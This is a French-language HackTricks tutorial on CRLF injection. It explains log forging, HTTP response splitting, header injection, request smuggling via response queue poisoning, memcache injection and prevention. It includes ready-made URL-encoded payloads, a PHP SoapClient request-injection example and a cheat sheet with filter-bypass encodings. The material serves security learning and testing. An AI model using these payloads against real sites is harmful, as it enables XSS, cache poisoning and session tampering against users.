# Injection CRLF (%0D%0A)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous √™tes int√©ress√© par une **carri√®re en piratage** et pirater l'impiratable - **nous recrutons !** (_ma√Ætrise du polonais √©crit et parl√© requise_).

{% embed url="https://www.stmcyber.com/careers" %}

### CRLF

Le retour chariot (CR) et le saut de ligne (LF), collectivement connus sous le nom de CRLF, sont des s√©quences de caract√®res sp√©ciaux utilis√©es dans le protocole HTTP pour indiquer la fin d'une ligne ou le d√©but d'une nouvelle. Les serveurs Web et les navigateurs utilisent CRLF pour distinguer entre les en-t√™tes HTTP et le corps d'une r√©ponse. Ces caract√®res sont universellement utilis√©s dans les communications HTTP/1.1 sur diff√©rents types de serveurs Web, tels que Apache et Microsoft IIS.

### Vuln√©rabilit√© d'injection CRLF

L'injection CRLF implique l'insertion des caract√®res CR et LF dans une entr√©e fournie par l'utilisateur. Cette action induit en erreur le serveur, l'application ou l'utilisateur en interpr√©tant la s√©quence inject√©e comme la fin d'une r√©ponse et le d√©but d'une autre. Bien que ces caract√®res ne soient pas intrins√®quement nocifs, leur mauvais usage peut entra√Æner une division de r√©ponse HTTP et d'autres activit√©s malveillantes.

### Exemple : Injection CRLF dans un fichier journal

[Exemple d'ici](https://www.invicti.com/blog/web-security/crlf-http-header/)

Consid√©rez un fichier journal dans un panneau d'administration qui suit le format : `IP - Heure - Chemin visit√©`. Une entr√©e typique pourrait ressembler √† :
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Un attaquant peut exploiter une injection CRLF pour manipuler ce journal. En injectant des caract√®res CRLF dans la requ√™te HTTP, l'attaquant peut modifier le flux de sortie et fabriquer des entr√©es de journal. Par exemple, une s√©quence inject√©e pourrait transformer l'entr√©e de journal en :
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Voici, `%0d` et `%0a` repr√©sentent les formes encod√©es en URL de CR et LF. Apr√®s l'attaque, le journal afficherait de mani√®re trompeuse:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
L'attaquant camoufle ainsi ses activit√©s malveillantes en faisant appara√Ætre que le localhost (une entit√© g√©n√©ralement de confiance dans l'environnement du serveur) a effectu√© les actions. Le serveur interpr√®te la partie de la requ√™te commen√ßant par `%0d%0a` comme un seul param√®tre, tandis que le param√®tre `restrictedaction` est analys√© comme une autre entr√©e distincte. La requ√™te manipul√©e imite efficacement une commande administrative l√©gitime : `/index.php?page=home&restrictedaction=edit`


### Fractionnement de R√©ponse HTTP

#### Description

Le fractionnement de r√©ponse HTTP est une vuln√©rabilit√© de s√©curit√© qui survient lorsqu'un attaquant exploite la structure des r√©ponses HTTP. Cette structure s√©pare les en-t√™tes du corps en utilisant une s√©quence de caract√®res sp√©cifique, un retour chariot (CR) suivi d'une avance de ligne (LF), collectivement appel√© CRLF. Si un attaquant parvient √† ins√©rer une s√©quence CRLF dans un en-t√™te de r√©ponse, il peut manipuler efficacement le contenu de la r√©ponse suivante. Ce type de manipulation peut entra√Æner de graves probl√®mes de s√©curit√©, notamment les attaques de type Cross-site Scripting (XSS).

#### XSS via le Fractionnement de R√©ponse HTTP

1. L'application d√©finit un en-t√™te personnalis√© comme ceci : `X-Custom-Header: UserInput`
2. L'application r√©cup√®re la valeur pour `UserInput` √† partir d'un param√®tre de requ√™te, disons "user_input". Dans les sc√©narios sans validation et encodage d'entr√©e appropri√©s, un attaquant peut cr√©er une charge utile qui inclut la s√©quence CRLF, suivie d'un contenu malveillant.
3. Un attaquant cr√©e une URL avec un 'user_input' sp√©cialement con√ßu : `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
- Dans cette URL, `%0d%0a%0d%0a` est la forme encod√©e en URL de CRLFCRLF. Cela trompe le serveur en ins√©rant une s√©quence CRLF, faisant en sorte que le serveur traite la partie suivante comme le corps de la r√©ponse.
4. Le serveur refl√®te l'entr√©e de l'attaquant dans l'en-t√™te de la r√©ponse, entra√Ænant une structure de r√©ponse non intentionnelle o√π le script malveillant est interpr√©t√© par le navigateur comme faisant partie du corps de la r√©ponse.

#### Un exemple de Fractionnement de R√©ponse HTTP conduisant √† une Redirection

Depuis [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Navigateur vers:
```
/%0d%0aLocation:%20http://myweb.com
```
Et le serveur r√©pond avec l'en-t√™te :
```
Location: http://myweb.com
```
**Autre exemple: (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### Dans le chemin de l'URL

Vous pouvez envoyer la charge utile **√† l'int√©rieur du chemin de l'URL** pour contr√¥ler la **r√©ponse** du serveur (exemple provenant de [ici](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Consultez plus d'exemples sur:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Injection d'en-t√™te HTTP

L'injection d'en-t√™te HTTP, souvent exploit√©e via l'injection CRLF (Retour chariot et saut de ligne), permet aux attaquants d'ins√©rer des en-t√™tes HTTP. Cela peut compromettre les m√©canismes de s√©curit√© tels que les filtres XSS (Cross-Site Scripting) ou la politique SOP (Same-Origin Policy), conduisant potentiellement √† un acc√®s non autoris√© √† des donn√©es sensibles, telles que des jetons CSRF, ou √† la manipulation des sessions utilisateur via l'implantation de cookies.

#### Exploitation de CORS via l'injection d'en-t√™te HTTP

Un attaquant peut injecter des en-t√™tes HTTP pour activer CORS (Cross-Origin Resource Sharing), contournant ainsi les restrictions impos√©es par SOP. Cette violation permet √† des scripts provenant d'origines malveillantes d'interagir avec des ressources d'une origine diff√©rente, potentiellement acc√©dant √† des donn√©es prot√©g√©es.

#### SSRF et injection de requ√™te HTTP via CRLF

L'injection CRLF peut √™tre utilis√©e pour cr√©er et injecter une toute nouvelle requ√™te HTTP. Un exemple notable de cela est la vuln√©rabilit√© dans la classe `SoapClient` de PHP, sp√©cifiquement dans le param√®tre `user_agent`. En manipulant ce param√®tre, un attaquant peut ins√©rer des en-t√™tes et du contenu de corps suppl√©mentaires, voire injecter enti√®rement une nouvelle requ√™te HTTP. Voici un exemple en PHP illustrant cette exploitation:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Injection d'en-t√™te pour le Smuggling de Requ√™tes

Pour plus d'informations sur cette technique et les probl√®mes potentiels, [**consultez la source originale**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

Vous pouvez injecter des en-t√™tes essentiels pour vous assurer que le **serveur garde la connexion ouverte** apr√®s avoir r√©pondu √† la requ√™te initiale :
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Apr√®s, une deuxi√®me requ√™te peut √™tre sp√©cifi√©e. Ce sc√©nario implique g√©n√©ralement [la contrebande de requ√™te HTTP](http-request-smuggling/), une technique o√π des en-t√™tes suppl√©mentaires ou des √©l√©ments de corps ajout√©s par le serveur post-injection peuvent entra√Æner divers exploits de s√©curit√©.

**Exploitation :**

1. **Injection de Pr√©fixe Malveillant** : Cette m√©thode implique de polluer la prochaine requ√™te de l'utilisateur ou un cache web en sp√©cifiant un pr√©fixe malveillant. Un exemple de ceci est :

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Cr√©ation d'un Pr√©fixe pour l'Empoisonnement de la File de R√©ponses** : Cette approche consiste √† cr√©er un pr√©fixe qui, combin√© √† des √©l√©ments r√©siduels, forme une deuxi√®me requ√™te compl√®te. Cela peut d√©clencher un empoisonnement de la file de r√©ponses. Un exemple est :

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Injection Memcache

Memcache est un **magasin cl√©-valeur qui utilise un protocole en texte clair**. Plus d'informations dans :

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Pour plus d'informations, lisez le** [**rapport original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Si une plateforme prend des **donn√©es d'une requ√™te HTTP et les utilise sans les d√©sinfecter** pour effectuer des **requ√™tes** vers un serveur **memcache**, un attaquant pourrait abuser de ce comportement pour **injecter de nouvelles commandes memcache**.

Par exemple, dans la vuln√©rabilit√© d√©couverte initialement, des cl√©s de cache √©taient utilis√©es pour renvoyer l'IP et le port auquel un utilisateur devait se connecter, et les attaquants pouvaient **injecter des commandes memcache** qui **empoisonnaient** le **cache pour envoyer les d√©tails des victimes** (noms d'utilisateur et mots de passe inclus) aux serveurs des attaquants :

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&h=178&auto=format&fit=crop"><figcaption></figcaption></figure>

De plus, les chercheurs ont √©galement d√©couvert qu'ils pouvaient d√©synchroniser les r√©ponses memcache pour envoyer les IP et ports des attaquants aux utilisateurs dont l'email n'√©tait pas connu de l'attaquant :

<figure><img src="../.gitbook/assets/image (40).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&h=506&auto=format&fit=crop"><figcaption></figcaption></figure>

### Comment Pr√©venir les Injections CRLF / En-t√™tes HTTP dans les Applications Web

Pour att√©nuer les risques d'injections CRLF (Retour chariot et Saut de ligne) ou d'injections d'en-t√™tes HTTP dans les applications web, les strat√©gies suivantes sont recommand√©es :

1. **√âviter les Entr√©es Utilisateur Directes dans les En-t√™tes de R√©ponse :**
L'approche la plus s√ªre est de s'abstenir d'incorporer directement les entr√©es fournies par l'utilisateur dans les en-t√™tes de r√©ponse.

2. **Encoder les Caract√®res Sp√©ciaux :**
Si √©viter les entr√©es utilisateur directes n'est pas possible, assurez-vous d'utiliser une fonction d√©di√©e √† l'encodage des caract√®res sp√©ciaux comme CR (Retour chariot) et LF (Saut de ligne). Cette pratique emp√™che la possibilit√© d'injection CRLF.

3. **Mettre √† Jour le Langage de Programmation :**
Mettez r√©guli√®rement √† jour le langage de programmation utilis√© dans vos applications web vers la derni√®re version. Optez pour une version qui interdit intrins√®quement l'injection de caract√®res CR et LF dans les fonctions charg√©es de d√©finir les en-t√™tes HTTP.

### FEUILLE DE TRICHE

[Feuille de triche √† partir d'ici](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Outils Automatiques

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Liste de D√©tection par Force Brute

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## R√©f√©rences
* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous √™tes int√©ress√© par une **carri√®re en piratage** et pirater l'impiratable - **nous recrutons !** (_ma√Ætrise du polonais √† l'√©crit et √† l'oral requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
